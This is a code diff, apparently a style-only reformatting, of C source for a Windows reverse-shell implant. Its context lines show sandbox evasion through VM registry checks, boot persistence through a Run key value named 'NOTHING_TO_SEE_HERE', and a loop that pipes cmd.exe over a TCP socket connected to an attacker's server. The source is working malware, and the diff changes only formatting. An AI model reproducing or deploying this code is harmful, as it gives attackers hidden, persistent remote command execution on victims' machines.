@@ -24,7 +24,7 @@ int is_vm() {
     char buffer[1024];
 
     /* check the windows reg for vm registry keys*/
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Virtual Machine\\Guest", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
         RegQueryValueExA(hKey, "Version", NULL, &dwType, (LPBYTE)buffer, &dwSize);
         RegCloseKey(hKey);
         printf("vm detected\n");
@@ -41,7 +41,7 @@ void persistance() {
     GetModuleFileNameA(NULL, path, MAX_PATH);
 
     /* try to create a registry key under HKEY_CURRENT_USER so executable runs on boot */
-    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+    if(RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         RegSetValueExA(hKey, "NOTHING_TO_SEE_HERE", 0, REG_SZ, (const BYTE *)path, strlen(path) + 1);
         printf("persistance set\n");
         RegCloseKey(hKey);
@@ -54,10 +54,11 @@ void persistance() {
 
 void remove_persistance() {
     HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+    if(RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         RegDeleteValueA(hKey, "NOTHING_TO_SEE_HERE");
         RegCloseKey(hKey);
-    } else {
+    }
+    else {
         printf("failed to open registry key for persistence removal.\n");
     }
 }
@@ -69,7 +70,7 @@ void shell(SOCKET sock) {
     /* allow pipes to be inherited by children */
     SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
     /* create an in and out pipe */
-    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) || !CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
+    if(!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) || !CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0)) {
         printf("failed to create pipes\n");
         return;
     }
@@ -89,7 +90,7 @@ void shell(SOCKET sock) {
     char *cmd[] = {"cmd.exe", NULL};
 
     /* create a new process with correct flags */
-    if (!CreateProcess(NULL, cmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    if(!CreateProcess(NULL, cmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         printf("failed to create process: %d\n", GetLastError());
         return;
     }
@@ -109,18 +110,18 @@ void shell(SOCKET sock) {
             buffer[recvResult] = '\0';
             printf("Received command: %s", buffer);
 
-            if (buffer[recvResult - 1] != '\n') {
+            if(buffer[recvResult - 1] != '\n') {
                 strcat(buffer, "\n");
             }
 
-            if (WriteFile(hStdInWrite, buffer, strlen(buffer), &bytesWritten, NULL)) {
+            if(WriteFile(hStdInWrite, buffer, strlen(buffer), &bytesWritten, NULL)) {
                 /* dont matter, dont ask */
             }
             else {
                 printf("failed to write to shell input: %d\n", GetLastError());
             }
              /* read the output from the shell and send back through socket to attacking machine */
-            if (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
+            if(ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                 send(sock, buffer, bytesRead, 0);
             }
             else {
@@ -161,7 +162,7 @@ int main(int argc, char *argv[]) {
     struct sockaddr_in server;
 
     /* initialize Winsock */
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+    if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         printf("WSAStartup failed");
         return 1;
     }
@@ -169,7 +170,7 @@ int main(int argc, char *argv[]) {
     /* create a TCP socket */
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    if (sock == INVALID_SOCKET) {
+    if(sock == INVALID_SOCKET) {
         printf("socket creation failed");
         WSACleanup();
         return 1;
@@ -180,7 +181,7 @@ int main(int argc, char *argv[]) {
     server.sin_port = htons(server_port);
     server.sin_addr.s_addr = inet_addr(server_ip);
 
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
+    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
         printf("connection failed");
         closesocket(sock);
         WSACleanup();
